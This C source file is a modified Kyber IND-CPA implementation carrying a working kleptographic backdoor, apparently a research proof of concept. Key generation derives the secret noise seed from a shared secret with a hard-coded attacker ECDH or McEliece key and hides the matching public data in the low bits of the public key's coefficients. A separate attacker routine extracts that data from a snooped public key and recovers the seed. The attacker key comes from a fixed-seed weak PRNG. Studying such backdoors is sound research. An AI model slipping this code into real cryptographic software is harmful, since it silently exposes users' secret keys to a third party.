#include <stddef.h>
#include <stdint.h>
#include "params.h"
#include "indcpa.h"
#include "polyvec.h"
#include "poly.h"
#include "ntt.h"
#include "symmetric.h"
#include "randombytes.h"
#include "math.h"
#include "crypto_kem.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <time.h>
#include "ecdh.h"

#include "gcm.h"    // define the various AES-GCM library functions
#include "klepto_attack.h"

uint8_t global_noise_seed[KYBER_SYMBYTES];
uint8_t global_noise_seed_enc[KYBER_SYMBYTES];

static uint8_t pub_ecdh_attacker[ECC_PUB_KEY_SIZE];
static uint8_t prv_ecdh_attacker[ECC_PRV_KEY_SIZE];

static uint8_t pub_keygen[ECC_PUB_KEY_SIZE];
static uint8_t prv_keygen[ECC_PRV_KEY_SIZE];


uint8_t pk_cm[crypto_kem_PUBLICKEYBYTES];
uint8_t sk_cm[crypto_kem_SECRETKEYBYTES];
uint8_t ct_cm[crypto_kem_CIPHERTEXTBYTES];

#if (PRE_OR_POST_QUANTUM_BACKDOOR == 1)

uint8_t sec_keygen[crypto_kem_BYTES];
uint8_t sec_klepto[crypto_kem_BYTES];

#else

static uint8_t sec_keygen[ECC_PUB_KEY_SIZE];
static uint8_t sec_klepto[ECC_PUB_KEY_SIZE];

#endif

uint8_t pk_snooped_by_attacker[KYBER_INDCPA_PUBLICKEYBYTES];
uint8_t ct_snooped_by_attacker[KYBER_INDCPA_BYTES];
int klepto_data_to_send_len_global;
size_t key_len_global, iv_len_global, aad_len_global, pt_len_global, ct_len_global, tag_len_global;

/* pseudo random number generator with 128 bit internal state... probably not suited for cryptographical usage */
typedef struct
{
  uint32_t a;
  uint32_t b;
  uint32_t c;
  uint32_t d;
} prng_t;

static prng_t prng_ctx;


static uint32_t prng_rotate(uint32_t x, uint32_t k)
{
  return (x << k) | (x >> (32 - k));
}


static uint32_t prng_next(void)
{
  uint32_t e = prng_ctx.a - prng_rotate(prng_ctx.b, 27);
  prng_ctx.a = prng_ctx.b ^ prng_rotate(prng_ctx.c, 17);
  prng_ctx.b = prng_ctx.c + prng_ctx.d;
  prng_ctx.c = prng_ctx.d + e;
  prng_ctx.d = e + prng_ctx.a;
  return prng_ctx.d;
}


static void prng_init(uint32_t seed)
{
  uint32_t i;
  prng_ctx.a = 0x10101010;
  prng_ctx.b = prng_ctx.c = prng_ctx.d = seed;

  for (i = 0; i < 31; ++i)
  {
    (void) prng_next();
  }
}

static int shift_lfsr(unsigned int *lfsr, unsigned int polynomial_mask)
{
    int feedback;

    feedback = *lfsr & 1;
    *lfsr >>= 1;
    if(feedback == 1)
        *lfsr ^= polynomial_mask;
    return *lfsr;
}

static int get_random(void)
{
    int temp;
    unsigned int POLY_MASK_HERE_1 = 0xAB65879A;
    unsigned int POLY_MASK_HERE_2 = 0x56637263;
    static unsigned int lfsr_1 = 0x9FAB54EB;
    static unsigned int lfsr_2 = 0x5DEC9221;
    shift_lfsr(&lfsr_1, POLY_MASK_HERE_1);
    shift_lfsr(&lfsr_2, POLY_MASK_HERE_2);
    temp = (shift_lfsr(&lfsr_1, POLY_MASK_HERE_1) ^ shift_lfsr(&lfsr_2, POLY_MASK_HERE_2)) & 0XFF;
    return (temp);
}


// Function to generate the public key of the attacker to be installed in key generation procedure...

void generate_ecdh_keypair(uint8_t *puba, uint8_t *prva)
{

  uint32_t i;

  /* 0. Initialize and seed random number generator */
  static int initialized = 0;
  if (!initialized)
  {
    prng_init((0xbad ^ 0xabcdef ^ 42) | 0x9fabcdef | 666);
    initialized = 1;
  }

  /* 1. Alice picks a (secret) random natural number 'a', calculates P = a * g and sends P to Bob. */
  for (i = 0; i < ECC_PRV_KEY_SIZE; ++i)
  {
    prva[i] = prng_next();
  }
  assert(ecdh_generate_keys(puba, prva));

}

/*************************************************
* Name:        pack_pk
*
* Description: Serialize the public key as concatenation of the
*              serialized vector of polynomials pk
*              and the public seed used to generate the matrix A.
*
* Arguments:   uint8_t *r: pointer to the output serialized public key
*              polyvec *pk: pointer to the input public-key polyvec
*              const uint8_t *seed: pointer to the input public seed
**************************************************/
static void pack_pk(uint8_t r[KYBER_INDCPA_PUBLICKEYBYTES],
                    polyvec *pk,
                    const uint8_t seed[KYBER_SYMBYTES])
{
  size_t i;
  polyvec_tobytes(r, pk);
  for(i=0;i<KYBER_SYMBYTES;i++)
    r[i+KYBER_POLYVECBYTES] = seed[i];
}

/*************************************************
* Name:        unpack_pk
*
* Description: De-serialize public key from a byte array;
*              approximate inverse of pack_pk
*
* Arguments:   - polyvec *pk: pointer to output public-key polynomial vector
*              - uint8_t *seed: pointer to output seed to generate matrix A
*              - const uint8_t *packedpk: pointer to input serialized public key
**************************************************/
static void unpack_pk(polyvec *pk,
                      uint8_t seed[KYBER_SYMBYTES],
                      const uint8_t packedpk[KYBER_INDCPA_PUBLICKEYBYTES])
{
  size_t i;
  polyvec_frombytes(pk, packedpk);
  for(i=0;i<KYBER_SYMBYTES;i++)
    seed[i] = packedpk[i+KYBER_POLYVECBYTES];
}

/*************************************************
* Name:        pack_sk
*
* Description: Serialize the secret key
*
* Arguments:   - uint8_t *r: pointer to output serialized secret key
*              - polyvec *sk: pointer to input vector of polynomials (secret key)
**************************************************/
static void pack_sk(uint8_t r[KYBER_INDCPA_SECRETKEYBYTES], polyvec *sk)
{
  polyvec_tobytes(r, sk);
}

/*************************************************
* Name:        unpack_sk
*
* Description: De-serialize the secret key; inverse of pack_sk
*
* Arguments:   - polyvec *sk: pointer to output vector of polynomials (secret key)
*              - const uint8_t *packedsk: pointer to input serialized secret key
**************************************************/
static void unpack_sk(polyvec *sk, const uint8_t packedsk[KYBER_INDCPA_SECRETKEYBYTES])
{
  polyvec_frombytes(sk, packedsk);
}

/*************************************************
* Name:        pack_ciphertext
*
* Description: Serialize the ciphertext as concatenation of the
*              compressed and serialized vector of polynomials b
*              and the compressed and serialized polynomial v
*
* Arguments:   uint8_t *r: pointer to the output serialized ciphertext
*              poly *pk: pointer to the input vector of polynomials b
*              poly *v: pointer to the input polynomial v
**************************************************/

static void pack_ciphertext(uint8_t r[KYBER_INDCPA_BYTES], polyvec *b, poly *v)
{
  polyvec_compress(r, b);
  poly_compress(r+KYBER_POLYVECCOMPRESSEDBYTES, v);
}

static void pack_ciphertext_klepto(uint8_t r[KYBER_INDCPA_BYTES], polyvec *b, poly *v, uint8_t * coins)
{
  klepto_polyvec_compress(r, b, coins);
  poly_compress(r+KYBER_POLYVECCOMPRESSEDBYTES, v);
}




/*************************************************
* Name:        unpack_ciphertext
*
* Description: De-serialize and decompress ciphertext from a byte array;
*              approximate inverse of pack_ciphertext
*
* Arguments:   - polyvec *b: pointer to the output vector of polynomials b
*              - poly *v: pointer to the output polynomial v
*              - const uint8_t *c: pointer to the input serialized ciphertext
**************************************************/
static void unpack_ciphertext(polyvec *b, poly *v, const uint8_t c[KYBER_INDCPA_BYTES])
{
  polyvec_decompress(b, c);
  poly_decompress(v, c+KYBER_POLYVECCOMPRESSEDBYTES);
}

/*************************************************
* Name:        rej_uniform
*
* Description: Run rejection sampling on uniform random bytes to generate
*              uniform random integers mod q
*
* Arguments:   - int16_t *r: pointer to output buffer
*              - unsigned int len: requested number of 16-bit integers (uniform mod q)
*              - const uint8_t *buf: pointer to input buffer (assumed to be uniformly random bytes)
*              - unsigned int buflen: length of input buffer in bytes
*
* Returns number of sampled 16-bit integers (at most len)
**************************************************/
static unsigned int rej_uniform(int16_t *r,
                                unsigned int len,
                                const uint8_t *buf,
                                unsigned int buflen)
{
  unsigned int ctr, pos;
  uint16_t val0, val1;

  ctr = pos = 0;
  while(ctr < len && pos + 3 <= buflen) {
    val0 = ((buf[pos+0] >> 0) | ((uint16_t)buf[pos+1] << 8)) & 0xFFF;
    val1 = ((buf[pos+1] >> 4) | ((uint16_t)buf[pos+2] << 4)) & 0xFFF;
    pos += 3;

    if(val0 < KYBER_Q)
      r[ctr++] = val0;
    if(ctr < len && val1 < KYBER_Q)
      r[ctr++] = val1;
  }

  return ctr;
}

#define gen_a(A,B)  gen_matrix(A,B,0)
#define gen_at(A,B) gen_matrix(A,B,1)

/*************************************************
* Name:        gen_matrix
*
* Description: Deterministically generate matrix A (or the transpose of A)
*              from a seed. Entries of the matrix are polynomials that look
*              uniformly random. Performs rejection sampling on output of
*              a XOF
*
* Arguments:   - polyvec *a: pointer to ouptput matrix A
*              - const uint8_t *seed: pointer to input seed
*              - int transposed: boolean deciding whether A or A^T is generated
**************************************************/
#define GEN_MATRIX_NBLOCKS ((12*KYBER_N/8*(1 << 12)/KYBER_Q + XOF_BLOCKBYTES)/XOF_BLOCKBYTES)
// Not static for benchmarking
void gen_matrix(polyvec *a, const uint8_t seed[KYBER_SYMBYTES], int transposed)
{
  unsigned int ctr, i, j, k;
  unsigned int buflen, off;
  uint8_t buf[GEN_MATRIX_NBLOCKS*XOF_BLOCKBYTES+2];
  xof_state state;

  for(i=0;i<KYBER_K;i++) {
    for(j=0;j<KYBER_K;j++) {
      if(transposed)
        xof_absorb(&state, seed, i, j);
      else
        xof_absorb(&state, seed, j, i);

      xof_squeezeblocks(buf, GEN_MATRIX_NBLOCKS, &state);
      buflen = GEN_MATRIX_NBLOCKS*XOF_BLOCKBYTES;
      ctr = rej_uniform(a[i].vec[j].coeffs, KYBER_N, buf, buflen);

      while(ctr < KYBER_N) {
        off = buflen % 3;
        for(k = 0; k < off; k++)
          buf[k] = buf[buflen - off + k];
        xof_squeezeblocks(buf + off, 1, &state);
        buflen = off + XOF_BLOCKBYTES;
        ctr += rej_uniform(a[i].vec[j].coeffs + ctr, KYBER_N - ctr, buf, buflen);
      }
    }
  }
}

/*************************************************
* Name:        indcpa_keypair
*
* Description: Generates public and private key for the CPA-secure
*              public-key encryption scheme underlying Kyber
*
* Arguments:   - uint8_t *pk: pointer to output public key
*                             (of length KYBER_INDCPA_PUBLICKEYBYTES bytes)
*              - uint8_t *sk: pointer to output private key
                              (of length KYBER_INDCPA_SECRETKEYBYTES bytes)
**************************************************/

// To generate this separately...

static int add_klepto_data(polyvec *pkpv, uint8_t *klepto_data, int klepto_data_to_send_len)
{

  int current_coeff_pos;
  uint8_t value_to_hide;
  uint8_t mask_value = 0xFF;
  int16_t current_coeff_value, current_coeff_value_final;

  int16_t coeff_value_debug_1, coeff_value_debug_2;
  int16_t temp_mod;

  uint8_t mod_value_of_current_coeff;
  uint8_t mod_value_of_new_coeff;
  int byte_pos;
  int bit_pos;

  int klepto_data_no_bits = klepto_data_to_send_len * 8;
  uint8_t klepto_data_in_bits[klepto_data_no_bits];

  for(int uu = 0; uu < klepto_data_no_bits; uu++)
  {
    byte_pos = (int)uu/8;
    bit_pos = (uu%8);
    klepto_data_in_bits[uu] = (klepto_data[byte_pos]>>bit_pos)&0x1;
  }

  int bit_start_pos;
  int bit_end_pos;

  uint8_t data_to_encode_mod;
  int difference_mod, difference_mod_8, difference_actual;

  int neg_value;

  for(int ii = 0; ii < KYBER_K; ii++)
  {
    for(int jj = 0; jj < KYBER_N; jj++)
    {
        current_coeff_pos = KYBER_N*ii+jj;

        bit_start_pos = current_coeff_pos * KLEPTO_BITS_PER_COEFF;
        bit_end_pos = (current_coeff_pos + 1) * KLEPTO_BITS_PER_COEFF;

        if(bit_start_pos > klepto_data_no_bits)
        {
          return 0;
        }

        if(bit_end_pos > klepto_data_no_bits)
        {
          bit_end_pos = klepto_data_no_bits;
        }

        data_to_encode_mod = 0;
        for(int ll = bit_start_pos; ll < bit_end_pos; ll++)
        {
          data_to_encode_mod = data_to_encode_mod | (klepto_data_in_bits[ll] << (ll - bit_start_pos));
        }
        coeff_value_debug_1 = pkpv->vec[ii].coeffs[jj];


        if(pkpv->vec[ii].coeffs[jj] < 0)
        {
          neg_value = 1;
          current_coeff_value = pkpv->vec[ii].coeffs[jj] + KYBER_Q;
        }
        else
        {
          neg_value = 0;
          current_coeff_value = pkpv->vec[ii].coeffs[jj];
        }

        int prev_current_coeff_value = current_coeff_value;
        mod_value_of_current_coeff = current_coeff_value % (1 << KLEPTO_BITS_PER_COEFF);

        int difffff_now, difffff_now_mod;
        difffff_now = abs(mod_value_of_current_coeff - data_to_encode_mod);
        difffff_now_mod = abs(difffff_now - (1 << KLEPTO_BITS_PER_COEFF));

        if(difffff_now < difffff_now_mod)
        {

          if(mod_value_of_current_coeff < data_to_encode_mod)
          {
            current_coeff_value = current_coeff_value + difffff_now;
          }
          else
          {
            current_coeff_value = current_coeff_value - difffff_now;
          }

          if(current_coeff_value < 0 && prev_current_coeff_value >= 0)
          {
            current_coeff_value = current_coeff_value + difffff_now_mod + difffff_now;
          }

        }
        else
        {

          if(mod_value_of_current_coeff < data_to_encode_mod)
          {
            current_coeff_value = current_coeff_value - difffff_now_mod;
          }
          else
          {
            current_coeff_value = current_coeff_value + difffff_now_mod;
          }

          if(current_coeff_value < 0 && prev_current_coeff_value >= 0)
          {
            current_coeff_value = current_coeff_value + difffff_now_mod + difffff_now;
          }

        }

        if(neg_value == 1)
        {
          pkpv->vec[ii].coeffs[jj] = current_coeff_value - KYBER_Q;
          if(pkpv->vec[ii].coeffs[jj] >= 0)
          {
            pkpv->vec[ii].coeffs[jj] = data_to_encode_mod;
          }
        }
        else
        {
          pkpv->vec[ii].coeffs[jj] = current_coeff_value;

        }

        coeff_value_debug_2 = pkpv->vec[ii].coeffs[jj];
    }
  }
}

void klepto_keygen_attacker_function(int mode)
{

  uint8_t seed[KYBER_SYMBYTES];
  polyvec pkpv_polyvec;
  polyvec one_matrix[KYBER_K];
  polyvec pkpv_temp;
  int i;

  uint16_t u_decompressed_coeffs[KYBER_K*KYBER_N];

  // Want to generate the attacker's public and private ecdh key...
  if(mode == 0) // Install the public key on target device...
  {

    key_len_global = 32;
    iv_len_global = 1;
    aad_len_global = 0;
    pt_len_global = 32;
    ct_len_global = 32;
    tag_len_global = 16;


    #if (PRE_OR_POST_QUANTUM_BACKDOOR == 1)

    cm_crypto_kem_keypair(pk_cm, sk_cm);

    #else

    // Generate ECDH key...
    generate_ecdh_keypair(pub_ecdh_attacker, prv_ecdh_attacker);

    #endif

  }

  else if(mode == 1)
  {

    // Here attacker has to use the public key to extract the ecc ciphertext and the ECC public key...

    unpack_pk(&pkpv_polyvec, seed, pk_snooped_by_attacker);

    for(int ii = 0; ii < KYBER_K; ii++)
    {
      for(int jj = 0; jj < KYBER_K; jj++)
      {
        for(int kk = 0; kk < KYBER_N; kk++)
        {
          if((ii == jj) && (kk%2) == 0)
            one_matrix[ii].vec[jj].coeffs[kk] = 1;
          else
            one_matrix[ii].vec[jj].coeffs[kk] = 0;
        }
      }
    }


    for(i=0;i<KYBER_K;i++)
      polyvec_basemul_acc_montgomery(&pkpv_temp.vec[i], &pkpv_polyvec, &(one_matrix[i]));

    polyvec_invntt_tomont(&pkpv_temp);

    int value_now, mod_value_now;
    int current_coeff_pos;
    int bit_pos, byte_pos;

    uchar *klepto_data_in_attacker;
    klepto_data_in_attacker = (uchar *) malloc(klepto_data_to_send_len_global);

    for(int kk = 0; kk < klepto_data_to_send_len_global; kk++)
    {
      klepto_data_in_attacker[kk] = 0x00;
    }

    uint8_t klepto_data_in_attacker_in_bits[klepto_data_to_send_len_global*8];

    for(int ii = 0; ii < KYBER_K; ii++)
    {
      for(int jj = 0; jj < KYBER_N; jj++)
      {
        current_coeff_pos = KYBER_N*ii+jj;
        byte_pos = (int)(current_coeff_pos*(KLEPTO_BITS_PER_COEFF)/8);
        bit_pos = (current_coeff_pos*KLEPTO_BITS_PER_COEFF)%8;

        if((current_coeff_pos*KLEPTO_BITS_PER_COEFF) < (klepto_data_to_send_len_global*8))
        {
          if(pkpv_temp.vec[ii].coeffs[jj] < 0)
            value_now = pkpv_temp.vec[ii].coeffs[jj] + KYBER_Q;
          else
            value_now = pkpv_temp.vec[ii].coeffs[jj];

          mod_value_now = value_now % (1 << KLEPTO_BITS_PER_COEFF);

          int bittt;
          for(int klk = 0; klk < KLEPTO_BITS_PER_COEFF; klk++)
            klepto_data_in_attacker_in_bits[current_coeff_pos*KLEPTO_BITS_PER_COEFF + klk] = (mod_value_now >> klk)&0x1;

        }
      }
    }

    for(int klk = 0; klk < klepto_data_to_send_len_global; klk++)
    {
      int bytte_now = 0;
      for(int qwq = 0; qwq < 8; qwq++)
        bytte_now = bytte_now | ((klepto_data_in_attacker_in_bits[klk*8+qwq]) << qwq);

      klepto_data_in_attacker[klk] = bytte_now;
    }



    #if (PRE_OR_POST_QUANTUM_BACKDOOR == 1)

    for(int kk = 0; kk < crypto_kem_CIPHERTEXTBYTES; kk++)
    {
      ct_cm[kk] = *(klepto_data_in_attacker + kk);
    }

    cm_crypto_kem_dec(sec_klepto, ct_cm, sk_cm);

    #else

    uint8_t ecc_public_key_klepto[ECC_PUB_KEY_SIZE];

    for(int kk = 0; kk < ECC_PUB_KEY_SIZE; kk++)
    {
      ecc_public_key_klepto[kk] = *(klepto_data_in_attacker + kk);
    }

    // Get the Public key and extract the information from this...

    ecdh_shared_secret(prv_ecdh_attacker, ecc_public_key_klepto, sec_klepto);


    #endif

    uint8_t extracted_noise_seed[KYBER_SYMBYTES];

    for(int kk = 0; kk < KYBER_SYMBYTES; kk++)
      *(extracted_noise_seed + kk) = *(sec_klepto + kk);

    int same_count = 0;

    for(int jj = 0; jj < KYBER_SYMBYTES; jj++)
    {
      if(*(extracted_noise_seed+jj) == *(global_noise_seed + jj))
      {
        same_count = same_count + 1;
      }
    }

    if(same_count == KYBER_SYMBYTES)
    {
      #if (DEBUG_PRINT == 1)
        printf("Attack Success...\n");
      #endif
    }
    else
    {
      printf("Attack Failure...\n");
    }

  }


}

void klepto_attack_public_key(polyvec *pkpv, uint8_t *noiseseed)
{
    polyvec one_matrix[KYBER_K];
    int i;

    int klepto_data_to_send_len = crypto_kem_CIPHERTEXTBYTES;
    klepto_data_to_send_len_global = klepto_data_to_send_len;

    uchar *klepto_data;
    klepto_data = (uchar *) malloc(klepto_data_to_send_len);

    #if (PRE_OR_POST_QUANTUM_BACKDOOR == 1)

    for(int kk = 0; kk < crypto_kem_CIPHERTEXTBYTES; kk++)
    {
      *(klepto_data + kk) = *(ct_cm + kk);
    }

    #else

    for(int kk = 0; kk < ECC_PUB_KEY_SIZE; kk++)
    {
      *(klepto_data + kk) = *(pub_keygen + kk);
    }

    #endif

    for(int ii = 0; ii < KYBER_K; ii++)
    {
      for(int jj = 0; jj < KYBER_K; jj++)
      {
        for(int kk = 0; kk < KYBER_N; kk++)
        {
          if((ii == jj) && (kk%2) == 0)
            one_matrix[ii].vec[jj].coeffs[kk] = 1;
          else
            one_matrix[ii].vec[jj].coeffs[kk] = 0;
        }
      }
    }

    polyvec pkpv_temp;

    for(i=0;i<KYBER_K;i++)
      polyvec_basemul_acc_montgomery(&pkpv_temp.vec[i], pkpv, &(one_matrix[i]));

    polyvec_invntt_tomont(&pkpv_temp);

    add_klepto_data(&pkpv_temp, klepto_data, klepto_data_to_send_len);

    for(int ii = 0; ii < KYBER_K; ii++)
    {
        poly_ntt(&(pkpv_temp.vec[ii]));
    }

    for(int ii = 0; ii < KYBER_K; ii++)
    {
      for(int jj = 0; jj < KYBER_N; jj++)
      {
        pkpv->vec[ii].coeffs[jj] = pkpv_temp.vec[ii].coeffs[jj];
      }
    }

}


void indcpa_keypair(uint8_t pk[KYBER_INDCPA_PUBLICKEYBYTES],
                    uint8_t sk[KYBER_INDCPA_SECRETKEYBYTES])
{
  unsigned int i;
  uint8_t buf[2*KYBER_SYMBYTES];
  const uint8_t *publicseed = buf;
  const uint8_t *noiseseed = buf+KYBER_SYMBYTES;
  uint8_t nonce = 0;
  polyvec a[KYBER_K], e, pkpv, skpv;

  // Now, we have seca secret... We can use the secret key to encrypt information...
  // We need to encrypt the noiseseed...

  #if (PRE_OR_POST_QUANTUM_BACKDOOR == 1)

  cm_crypto_kem_enc(ct_cm, sec_keygen, pk_cm);

  #else

  generate_ecdh_keypair(pub_keygen, prv_keygen);
  assert(ecdh_shared_secret(prv_keygen, pub_ecdh_attacker, sec_keygen));

  #endif

  randombytes(buf, KYBER_SYMBYTES);

  hash_g(buf, buf, KYBER_SYMBYTES);

  gen_a(a, publicseed);

  for(int kk = 0; kk < pt_len_global; kk++)
  {
    *(buf+KYBER_SYMBYTES+kk) = *(sec_keygen+kk);
  }

  for(int kk = 0; kk < pt_len_global; kk++)
  {
    *(global_noise_seed + kk) = *(noiseseed+kk);
  }

  for(i=0;i<KYBER_K;i++)
    poly_getnoise_eta1(&skpv.vec[i], noiseseed, nonce++);

  for(i=0;i<KYBER_K;i++)
    poly_getnoise_eta1(&e.vec[i], noiseseed, nonce++);

  // The encryption of noise seed can be added to the public key...

  polyvec_ntt(&skpv);
  polyvec_ntt(&e);

  // matrix-vector multiplication
  for(i=0;i<KYBER_K;i++)
  {
    polyvec_basemul_acc_montgomery(&pkpv.vec[i], &a[i], &skpv);
    poly_tomont(&pkpv.vec[i]);
  }

  polyvec_add(&pkpv, &pkpv, &e);
  polyvec_reduce(&pkpv);

  #if (KLEPTO_KEYGEN == 1)

  klepto_attack_public_key(&pkpv, noiseseed);

  #endif

  pack_sk(sk, &skpv);
  pack_pk(pk, &pkpv, publicseed);


  for(int kk=0; kk<KYBER_INDCPA_PUBLICKEYBYTES; kk++)
    pk_snooped_by_attacker[kk] = pk[kk];

}

/*************************************************
* Name:        indcpa_enc
*
* Description: Encryption function of the CPA-secure
*              public-key encryption scheme underlying Kyber.
*
* Arguments:   - uint8_t *c: pointer to output ciphertext
*                            (of length KYBER_INDCPA_BYTES bytes)
*              - const uint8_t *m: pointer to input message
*                                  (of length KYBER_INDCPA_MSGBYTES bytes)
*              - const uint8_t *pk: pointer to input public key
*                                   (of length KYBER_INDCPA_PUBLICKEYBYTES)
*              - const uint8_t *coins: pointer to input random coins used as seed
*                                      (of length KYBER_SYMBYTES) to deterministically
*                                      generate all randomness
**************************************************/
void indcpa_enc(uint8_t c[KYBER_INDCPA_BYTES],
                const uint8_t m[KYBER_INDCPA_MSGBYTES],
                const uint8_t pk[KYBER_INDCPA_PUBLICKEYBYTES],
                const uint8_t coins[KYBER_SYMBYTES])
{
  unsigned int i;
  uint8_t seed[KYBER_SYMBYTES];
  uint8_t nonce = 0;
  polyvec sp, pkpv, ep, at[KYBER_K], b;
  poly v, k, epp;

  unpack_pk(&pkpv, seed, pk);
  poly_frommsg(&k, m);
  gen_at(at, seed);

  for(i=0;i<KYBER_K;i++)
    poly_getnoise_eta1(sp.vec+i, coins, nonce++);
  for(i=0;i<KYBER_K;i++)
    poly_getnoise_eta2(ep.vec+i, coins, nonce++);
  poly_getnoise_eta2(&epp, coins, nonce++);

  for(int kk = 0; kk < pt_len_global; kk++)
  {
    *(global_noise_seed_enc + kk) = *(coins+kk);
  }

  polyvec_ntt(&sp);

  // matrix-vector multiplication
  for(i=0;i<KYBER_K;i++)
    polyvec_basemul_acc_montgomery(&b.vec[i], &at[i], &sp);

  polyvec_basemul_acc_montgomery(&v, &pkpv, &sp);

  polyvec_invntt_tomont(&b);
  poly_invntt_tomont(&v);

  polyvec_add(&b, &b, &ep);
  poly_add(&v, &v, &epp);
  poly_add(&v, &v, &k);
  polyvec_reduce(&b);
  poly_reduce(&v);

  pack_ciphertext(c, &b, &v);
}


void indcpa_enc_cmp(uint8_t c[KYBER_INDCPA_BYTES],
                const uint8_t m[KYBER_INDCPA_MSGBYTES],
                const uint8_t pk[KYBER_INDCPA_PUBLICKEYBYTES],
                const uint8_t coins[KYBER_SYMBYTES])
{
  unsigned int i;
  uint8_t seed[KYBER_SYMBYTES];
  uint8_t nonce = 0;
  polyvec sp, pkpv, ep, at[KYBER_K], b;
  poly v, k, epp;

  unpack_pk(&pkpv, seed, pk);
  poly_frommsg(&k, m);
  gen_at(at, seed);

  for(i=0;i<KYBER_K;i++)
    poly_getnoise_eta1(sp.vec+i, coins, nonce++);
  for(i=0;i<KYBER_K;i++)
    poly_getnoise_eta2(ep.vec+i, coins, nonce++);
  poly_getnoise_eta2(&epp, coins, nonce++);

  polyvec_ntt(&sp);

  // matrix-vector multiplication
  for(i=0;i<KYBER_K;i++)
    polyvec_basemul_acc_montgomery(&b.vec[i], &at[i], &sp);

  polyvec_basemul_acc_montgomery(&v, &pkpv, &sp);

  polyvec_invntt_tomont(&b);
  poly_invntt_tomont(&v);

  polyvec_add(&b, &b, &ep);
  poly_add(&v, &v, &epp);
  poly_add(&v, &v, &k);
  polyvec_reduce(&b);
  poly_reduce(&v);
  pack_ciphertext(c, &b, &v);
}


/*************************************************
* Name:        indcpa_dec
*
* Description: Decryption function of the CPA-secure
*              public-key encryption scheme underlying Kyber.
*
* Arguments:   - uint8_t *m: pointer to output decrypted message
*                            (of length KYBER_INDCPA_MSGBYTES)
*              - const uint8_t *c: pointer to input ciphertext
*                                  (of length KYBER_INDCPA_BYTES)
*              - const uint8_t *sk: pointer to input secret key
*                                   (of length KYBER_INDCPA_SECRETKEYBYTES)
**************************************************/
void indcpa_dec(uint8_t m[KYBER_INDCPA_MSGBYTES],
                const uint8_t c[KYBER_INDCPA_BYTES],
                const uint8_t sk[KYBER_INDCPA_SECRETKEYBYTES])
{
  polyvec b, skpv;
  poly v, mp;

  unpack_ciphertext(&b, &v, c);

  unpack_sk(&skpv, sk);

  polyvec_ntt(&b);
  polyvec_basemul_acc_montgomery(&mp, &skpv, &b);
  poly_invntt_tomont(&mp);

  poly_sub(&mp, &v, &mp);
  poly_reduce(&mp);

  poly_tomsg(m, &mp);
}
